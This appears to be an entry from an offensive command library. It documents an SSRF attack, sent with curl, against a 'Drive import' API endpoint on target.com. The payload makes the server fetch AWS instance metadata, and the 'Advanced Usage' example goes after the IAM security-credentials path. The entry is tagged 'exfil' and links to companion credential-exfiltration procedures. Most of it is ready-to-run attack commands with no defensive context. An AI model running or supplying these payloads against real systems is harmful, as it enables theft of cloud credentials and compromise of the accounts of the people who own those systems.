---
id: c2d3e4f5-g6h7-8901-jklm-no5678901234
data: >-
  curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type:
  application/json' -d '{"url":
  "https://drive.google.com/uc?export=download&id=ssrf&internal=http://169.254.169.254/latest/meta-data/instance-id"}'
tags:
  - exfil
  - aws
type: command
output: null
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:24.202Z'
verified: false
validated: true
submitted: true
---
# curl-metadata-fetch

## Command

```bash
curl -X POST 'https://target.com/api/import-from-drive' -H 'Content-Type: application/json' -d '{"url": "https://drive.google.com/uc?export=download&id=ssrf&internal=http://169.254.169.254/latest/meta-data/instance-id"}'
```

## Description

Fetches AWS instance metadata via SSRF payload in the Drive import API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d '{...}'` | JSON with internal URL | Yes |
| `internal=` | Path to metadata endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/api/import-from-drive' -d '{"url": "https://drive.google.com/uc?internal=http://169.254.169.254/latest/meta-data/"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/api/import-from-drive' -d '{"url": "https://drive.google.com/uc?internal=http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

## Expected Output

Text or JSON with instance details, e.g., 'i-1234567890abcdef0'.

## Related

- [[commands/curl-iam-exfil]]
- [[procedures/Exfiltrate-AWS-Metadata]]
